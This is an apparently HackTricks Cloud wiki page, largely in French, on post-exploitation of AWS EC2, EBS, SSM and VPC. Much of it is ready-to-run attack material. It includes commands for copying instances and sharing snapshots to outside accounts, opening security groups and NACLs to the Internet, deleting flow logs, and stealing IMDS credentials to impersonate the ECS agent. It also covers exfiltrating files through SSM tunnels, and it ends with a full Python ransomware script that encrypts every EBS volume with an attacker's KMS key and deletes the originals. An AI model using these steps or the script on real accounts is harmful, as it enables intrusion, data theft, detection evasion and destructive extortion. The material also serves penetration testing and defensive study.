# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

For more information check:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Miroir VPC malveillant -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

Le traffic mirroring VPC **duplique le trafic entrant et sortant des instances EC2 au sein d'un VPC** sans nécessiter d'installer quoi que ce soit sur les instances elles-mêmes. Ce trafic dupliqué est couramment envoyé vers un système de détection d'intrusion réseau (IDS) pour analyse et surveillance.\
Un attaquant pourrait abuser de cela pour capturer tout le trafic et en extraire des informations sensibles :

For more information check this page:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Les instances contiennent généralement des informations sensibles. Il existe différentes façons d'y accéder (check [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Cependant, une autre façon d'examiner ce qu'elles contiennent est de **créer une AMI et de lancer une nouvelle instance (même dans votre propre compte) à partir de celle-ci** :
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Les snapshots sont des sauvegardes de volumes**, qui contiennent généralement **des informations sensibles**, donc les vérifier devrait révéler ces informations.\
Si vous trouvez un **volume sans snapshot** vous pouvez : **créer un snapshot** et effectuer les actions suivantes ou simplement **le monter dans une instance** à l'intérieur du compte :

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Exporter une AMI EC2 directement vers S3 en utilisant `CreateStoreImageTask` pour obtenir une image disque brute sans partage de snapshot. Cela permet une forensique hors ligne complète ou le vol de données tout en laissant la mise en réseau de l'instance intacte.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Attacher un volume io1/io2 Multi-Attach à une seconde instance et le monter en lecture seule pour siphonner des données en direct sans snapshots. Utile lorsque le volume victime a déjà Multi-Attach activé dans la même AZ.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Créer un EC2 Instance Connect Endpoint, autoriser l'ingress, et injecter des clés SSH éphémères pour accéder aux instances privées via un tunnel géré. Offre des chemins de mouvement latéral rapides sans ouvrir de ports publics.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Déplacer l'adresse IP privée secondaire d'un ENI victime vers un ENI contrôlé par l'attaquant pour usurper des hôtes de confiance allowlistés par IP. Permet de contourner des ACL internes ou des règles SG basées sur des adresses spécifiques.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Réassocier un Elastic IP de l'instance victime à l'attaquant afin d'intercepter le trafic entrant ou d'initier des connexions sortantes qui semblent provenir d'IP publiques de confiance.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Si une règle de security group référence une customer-managed prefix list, ajouter des CIDR de l'attaquant à la liste étend silencieusement l'accès à toutes les règles SG dépendantes sans modifier le SG lui-même.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Créer des gateway ou interface VPC endpoints pour retrouver l'accès sortant depuis des subnets isolés. Tirer parti des AWS-managed private links contourne l'absence de contrôles IGW/NAT pour l'exfiltration de données.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

Un attaquant disposant de la permission `ec2:AuthorizeSecurityGroupIngress` peut ajouter des règles entrantes aux security groups (par exemple, autoriser `tcp:80` depuis `0.0.0.0/0`), exposant ainsi des services internes à l'Internet public ou à des réseaux autrement non autorisés.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
Un attaquant disposant des permissions ec2:ReplaceNetworkAclEntry (ou similaires) peut modifier les Network ACLs (NACLs) d'un sous-réseau pour les rendre très permissives — par exemple en autorisant 0.0.0.0/0 sur des ports critiques — exposant ainsi l'ensemble de la plage du sous-réseau à l'Internet ou à des segments réseau non autorisés. Contrairement aux Security Groups, qui sont appliqués par instance, les NACLs sont appliqués au niveau du sous-réseau, donc modifier un NACL restrictif peut avoir un rayon d'impact beaucoup plus large en permettant l'accès à bien plus d'hôtes.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

Un attaquant disposant des permissions `ec2:Delete*` et `iam:Remove*` peut supprimer des ressources d'infrastructure et des configurations critiques — par exemple key pairs, launch templates/versions, AMIs/snapshots, volumes or attachments, security groups or rules, ENIs/network endpoints, route tables, gateways, or managed endpoints. Cela peut provoquer une interruption de service immédiate, une perte de données et la perte de preuves forensiques.

One example is deleting a security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Exfiltration inter-compte

Point VPC Flow Logs to an attacker-controlled S3 bucket to continuously collect network metadata (source/destination, ports) outside the victim account for long-term reconnaissance.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Exfiltration de données

#### Exfiltration DNS

Même si vous verrouillez une EC2 pour empêcher tout trafic sortant, elle peut toujours **exfil via DNS**.

- **VPC Flow Logs ne l'enregistreront pas.**
- Vous n'avez pas accès aux logs DNS AWS.
- Désactivez ceci en réglant "enableDnsSupport" à false avec:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via appels API

Un attaquant pourrait appeler des endpoints API d'un compte qu'il contrôle. Cloudtrail enregistrera ces appels et l'attaquant pourra voir les données exfiltrées dans les logs Cloudtrail.

### Security group ouvert

Vous pourriez obtenir un accès supplémentaire aux services réseau en ouvrant des ports comme ceci:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc vers ECS

Il est possible d'exécuter une instance EC2 et de l'enregistrer pour être utilisée afin d'exécuter des instances ECS, puis de voler les données des instances ECS.

Pour [**plus d'informations, voir ceci**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### ECS-on-EC2 IMDS Abuse & ECS Agent Impersonation

Une compromission à l'intérieur de n'importe quelle tâche ECS s'exécutant sur une instance conteneur EC2 suffit typiquement à pivoter vers le rôle host et les rôles IAM associés à toutes les autres tâches de ce nœud. Parce qu'il n'y a **pas d'isolation des tâches pour ECS-on-EC2**, chaque tâche peut interroger par défaut le EC2 Instance Metadata Service (IMDS), voler le instance profile de la container instance, puis parler le même protocole WebSocket que l'agent ECS utilise vers le control plane (le **ECScape** primitive) pour demander les credentials de chaque tâche actuellement planifiée sur cet hôte. Latacora a documenté ce workflow dans leur [ECS-on-EC2 IMDS research](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/), que le résumé offensif suivant condense.

#### Chaîne d'attaque

1. **Voler le instance profile depuis l'intérieur du conteneur.** Supposons qu'IMDSv2 soit requis, donc demandez un token puis récupérez le profile.

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/{InstanceProfileName}
```
2. **Utiliser le rôle de la container instance pour usurper l'agent ECS.** Avec ces credentials vous pouvez parler au canal WebSocket non documenté que l'agent ECS utilise ; le control plane vous fait confiance en tant que véritable agent et délivre **tous les credentials IAM des tâches** à votre processus. Vous pouvez maintenant exécuter localement des tâches à privilèges supérieurs, dumper les secrets d'environnement des tâches, ou mettre à jour services/tasks pour redéployer des workloads que vous pouvez inspecter entièrement.

#### Atteignabilité d'IMDS avec IMDSv2 + hop limit 1

Configurer IMDSv2 avec `HttpTokens=required` et `HttpPutResponseHopLimit=1` ne bloque que les tâches qui vivent derrière un saut supplémentaire (Docker bridge). Les autres modes réseau restent à un seul saut du Nitro controller et reçoivent toujours des réponses :

| ECS network mode | IMDS reachable? | Reason |
| --- | --- | --- |
| `awsvpc` | ✅ | Chaque tâche obtient sa propre ENI qui est toujours à un saut de l'IMDS, donc les tokens et les réponses metadata arrivent correctement. |
| `host` | ✅ | Les tâches partagent le namespace de l'hôte, donc elles voient la même distance en sauts que l'instance EC2. |
| `bridge` | ❌ | Les réponses meurent sur le Docker bridge car ce saut supplémentaire épuise le hop limit. |

Donc, **ne supposez jamais que hop limit 1 protège les workloads awsvpc ou host-mode** — testez toujours depuis l'intérieur de vos conteneurs.

#### Détecter les blocages d'IMDS par mode réseau

- **awsvpc tasks :** Les security groups, NACLs ou ajustements de routage ne peuvent pas bloquer l'adresse link-local 169.254.169.254 parce que Nitro l'injecte sur l'hôte. Vérifiez `/etc/ecs/ecs.config` pour `ECS_AWSVPC_BLOCK_IMDS=true`. Si le flag est absent (valeur par défaut) vous pouvez curl IMDS directement depuis la tâche. Si il est défini, pivotez dans le namespace host/agent pour le rétablir ou exécutez vos outils en dehors d'awsvpc.

- **bridge mode :** Quand les requêtes metadata échouent même si hop limit 1 est configuré, les défenseurs ont probablement inséré une règle DROP `DOCKER-USER` telle que `--in-interface docker+ --destination 169.254.169.254/32 --jump DROP`. Lister `iptables -S DOCKER-USER` l'expose, et un accès root vous permet de supprimer ou de réordonner la règle avant d'interroger IMDS.

- **host mode :** Inspectez la configuration de l'agent pour `ECS_ENABLE_TASK_IAM_ROLE_NETWORK_HOST=false`. Ce réglage supprime complètement les task IAM roles, donc vous devez soit le réactiver, passer à des tâches awsvpc, soit voler des credentials via un autre processus sur l'hôte. Quand la valeur est `true` (par défaut), chaque process en host-mode — y compris les conteneurs compromis — peut atteindre IMDS à moins que des filtres eBPF/cgroup sur-mesure ciblent `169.254.169.254` ; cherchez des programmes tc/eBPF ou des règles iptables référant cette adresse.

Latacora a même publié [Terraform validation code](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening) que vous pouvez déposer dans un compte cible pour énumérer quels modes réseau exposent encore les metadata et planifier votre prochain saut en conséquence.

Une fois que vous comprenez quels modes exposent IMDS, vous pouvez planifier votre chemin de post-exploitation : ciblez n'importe quelle tâche ECS, demandez le instance profile, usurpez l'agent, et récoltez les rôles de toutes les autres tâches pour mouvement latéral ou persistance à l'intérieur du cluster.

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Autorisations requises :

- `ssm:StartSession`

En plus de l'exécution de commandes, SSM permet le tunneling de trafic qui peut être abusé pour pivoting depuis des instances EC2 qui n'ont pas d'accès réseau à cause des Security Groups ou des NACLs.
Un des scénarios où cela est utile est le pivoting depuis un [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) vers un cluster EKS privé.

> Pour démarrer une session, vous devez avoir installé le SessionManagerPlugin : https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Installez le SessionManagerPlugin sur votre machine
2. Connectez-vous au Bastion EC2 en utilisant la commande suivante:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Récupérer les identifiants temporaires AWS du Bastion EC2 avec le script [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment)
4. Transférer les identifiants vers votre machine dans le fichier `$HOME/.aws/credentials` en tant que profil `[bastion-ec2]`
5. Se connecter à EKS en tant que Bastion EC2 :
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Mettez à jour le champ `server` dans le fichier `$HOME/.kube/config` pour qu'il pointe vers `https://localhost`
7. Créez un tunnel SSM comme suit :
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Le trafic de l'outil `kubectl` est maintenant acheminé via le tunnel SSM à travers le Bastion EC2 et vous pouvez accéder au cluster EKS privé depuis votre propre machine en exécutant :
```shell
kubectl get pods --insecure-skip-tls-verify
```
Notez que les connexions SSL échoueront à moins que vous ne définissiez le flag `--insecure-skip-tls-verify ` (ou son équivalent dans les outils d'audit K8s). Étant donné que le trafic est tunnelisé via le tunnel sécurisé AWS SSM, vous êtes protégé contre tout type d'attaque MitM.

Enfin, cette technique n'est pas spécifique à l'attaque de clusters EKS privés. Vous pouvez définir des domaines et des ports arbitraires pour pivoter vers n'importe quel autre service AWS ou une application personnalisée.

---

#### Transfert de port rapide Local ↔️ distant (AWS-StartPortForwardingSession)

Si vous avez seulement besoin de rediriger **un seul port TCP depuis l'instance EC2 vers votre hôte local** vous pouvez utiliser le document SSM `AWS-StartPortForwardingSession` (aucun paramètre hôte distant requis) :
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
La commande établit un tunnel bidirectionnel entre votre workstation (`localPortNumber`) et le port sélectionné (`portNumber`) sur l'instance **sans ouvrir de règles Security-Group entrantes**.

Common use cases:

* **File exfiltration**
1. Sur l'instance, démarrez un serveur HTTP rapide pointant vers le répertoire que vous voulez exfiltrer :

```bash
python3 -m http.server 8000
```

2. Depuis votre workstation, récupérez les fichiers via le tunnel SSM :

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Accès aux applications web internes (ex. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Astuce : compressez et chiffrez les preuves avant exfiltrating afin que CloudTrail n'enregistre pas le contenu en clair :
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Partager AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Rechercher des informations sensibles dans des AMIs publiques et privées

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel est un outil conçu pour **rechercher des informations sensibles dans des Amazon Machine Images (AMIs) publiques ou privées**. Il automatise le processus de lancement d'instances à partir des AMIs ciblées, le montage de leurs volumes et l'analyse à la recherche de secrets potentiels ou de données sensibles.

### Partager EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Une preuve de concept similaire à la démonstration de Ransomware présentée dans les notes de post-exploitation S3. KMS devrait être renommé en RMS pour Ransomware Management Service, tant il est facile à utiliser pour chiffrer divers services AWS.

Tout d'abord, depuis un compte AWS 'attacker', créez une customer managed key dans KMS. Dans cet exemple, nous laisserons AWS gérer les données de la clé pour nous, mais dans un scénario réaliste un acteur malveillant conserverait les données de la clé en dehors du contrôle d'AWS. Modifiez la key policy pour permettre à tout Principal de compte AWS d'utiliser la clé. Pour cette key policy, le nom du compte était 'AttackSim' et la règle de policy autorisant l'accès total s'appelle 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
La key policy doit avoir les actions suivantes activées pour permettre de l'utiliser pour chiffrer un volume EBS :

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Maintenant que la clé publiquement accessible est disponible. Nous pouvons utiliser un compte 'victim' qui contient des instances EC2 démarrées avec des volumes EBS non chiffrés attachés. Les volumes EBS de ce compte 'victim' sont la cible de notre chiffrement ; cette attaque se déroule sous l'hypothèse d'une compromission d'un compte AWS à privilèges élevés.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Similaire à l'exemple S3 ransomware. Cette attaque va créer des copies des volumes EBS attachés en utilisant des snapshots, utiliser la clé publiquement disponible du compte 'attacker' pour chiffrer les nouveaux volumes EBS, détacher ensuite les volumes EBS originaux des instances EC2 et les supprimer, puis enfin supprimer les snapshots utilisés pour créer les nouveaux volumes EBS chiffrés. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Cela a pour résultat que seuls des volumes EBS chiffrés restent disponibles dans le compte.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Il est également important de noter que le script a arrêté les instances EC2 pour détacher et supprimer les volumes EBS originaux. Les volumes originaux non chiffrés ont été supprimés.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Ensuite, revenez à la key policy du compte 'attacker' et supprimez la règle 'Outside Encryption' de cette key policy.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Attendez un instant que la nouvelle key policy se propage. Ensuite, retournez sur le compte 'victim' et tentez d'attacher un des volumes EBS nouvellement chiffrés. Vous verrez que vous pouvez attacher le volume.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Mais lorsque vous tentez réellement de démarrer à nouveau l'instance EC2 avec le volume EBS chiffré, cela échouera : l'état passera de 'pending' à 'stopped' indéfiniment, car le volume EBS attaché ne peut pas être déchiffré avec la key puisque la key policy ne le permet plus.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Ceci est le script python utilisé. Il prend des identifiants AWS pour un compte 'victim' et une valeur ARN AWS publiquement accessible pour la key à utiliser pour le chiffrement. Le script créera des copies chiffrées de TOUS les volumes EBS disponibles attachés à TOUTES les instances EC2 du compte AWS ciblé, puis arrêtera chaque instance EC2, détachera les volumes EBS originaux, les supprimera, et enfin supprimera tous les snapshots utilisés durant le processus. Cela laissera uniquement des volumes EBS chiffrés dans le compte 'victim' ciblé. N'UTILISEZ CE SCRIPT QUE DANS UN ENVIRONNEMENT DE TEST, IL EST DESTRUCTIF ET SUPPRIMERA TOUS LES VOLUMES EBS ORIGINAUX. Vous pouvez les récupérer en utilisant la KMS key utilisée et les restaurer à leur état d'origine via les snapshots, mais je tiens à vous avertir qu'il s'agit, au final, d'un ransomware PoC.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Références

- [Latacora - ECS on EC2: Covering Gaps in IMDS Hardening](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/)
- [Latacora ecs-on-ec2-gaps-in-imds-hardening Terraform repo](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening)
- [Pentest Partners – How to transfer files in AWS using SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
